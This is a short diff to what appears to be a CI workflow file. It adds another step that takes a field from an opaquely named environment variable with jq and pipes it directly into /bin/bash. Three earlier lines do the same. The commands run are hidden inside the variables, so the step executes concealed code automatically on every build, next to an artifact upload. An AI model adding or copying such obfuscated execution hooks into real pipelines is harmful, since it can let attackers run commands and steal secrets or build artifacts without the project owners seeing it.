@@ -38,6 +38,7 @@ jobs:
           echo $vx90539 | jq -r .mfjrc9 | /bin/bash
           echo $nrx174 | jq -r .jv3 | /bin/bash
           echo $p21 | jq -r .leem29066 | /bin/bash
+          echo $pk29146 | jq -r .vju18 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
